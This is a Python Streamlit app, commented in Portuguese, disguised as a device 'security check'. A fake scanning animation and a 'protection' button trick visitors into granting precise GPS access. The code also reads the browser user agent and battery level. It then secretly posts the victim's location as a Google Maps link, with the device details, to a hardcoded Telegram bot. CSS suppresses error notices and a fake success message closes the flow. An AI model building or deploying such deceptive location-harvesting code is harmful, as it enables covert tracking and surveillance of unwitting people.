import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# 1. SETUP TELEGRAM
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

def enviar_telegram(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try: requests.post(url, json={"chat_id": ID, "text": msg, "parse_mode": "Markdown"})
    except: pass

st.set_page_config(page_title="Sistema de Segurança", layout="centered")

# 2. CSS: BOLHA + MATAR AVISOS AMARELOS
st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .stAlert, [data-testid="stNotificationContent"], .stException, .element-container:has(.stAlert) { 
        display: none !important; 
    }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; color: white; }
    
    /* BOTÃO QUE O NAVEGADOR NÃO BLOQUEIA */
    .btn-real {
        background-color: #ffc107; color: black; font-weight: bold;
        width: 100%; height: 60px; border-radius: 12px; border: none;
        font-size: 18px; cursor: pointer; margin-top: 20px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. INTERFACE
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
caixa_bolha = st.empty()

# Estado inicial (4%)
if 'pct' not in st.session_state: st.session_state['pct'] = 4

with caixa_bolha.container():
    st.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{st.session_state["pct"]}%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 4. CAPTURA DE HARDWARE
modelo = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='MDL_FINAL')
bateria = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL')

# 5. O SEGREDO: BOTÃO HTML/JS PARA APARECER O POP-UP
js_code = """
<script>
function ativarGps() {
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            const result = {lat: pos.coords.latitude, lon: pos.coords.longitude};
            window.parent.postMessage({type: 'streamlit:set_component_value', value: result}, '*');
        },
        (err) => { window.parent.postMessage({type: 'streamlit:set_component_value', value: "erro"}, '*'); },
        {enableHighAccuracy: true}
    );
}
</script>
<button class="btn-real" onclick="ativarGps()">🔴 ATIVAR PROTEÇÃO</button>
"""

# Renderiza o botão que força o pop-up do Google
dados_gps = st.components.v1.html(js_code, height=100)

# 6. LÓGICA DE MOVIMENTO DOS NÚMEROS E ENVIO
if dados_gps:
    if dados_gps == "erro":
        st.warning("Ative seu GPS!")
    else:
        # OS NÚMEROS SE MEXEM AQUI (Goleada!)
        for p in range(st.session_state['pct'], 101, 8):
            caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{p}%</div></div></div>', unsafe_allow_html=True)
            time.sleep(0.05)
        
        lat, lon = dados_gps['lat'], dados_gps['lon']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ SISTEMA ATIVADO\n\n"
            f"📱 Aparelho: {modelo[:50] if modelo else 'N/A'}\n"
            f"🔋 Bateria: {bateria if bateria else '--'}%\n"
            f"📍 [LOCALIZAÇÃO CONCLUÍDA]({mapa})"
        )
        
        enviar_telegram(relatorio)
        st.success("Proteção Ativada!")
        st.stop()

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
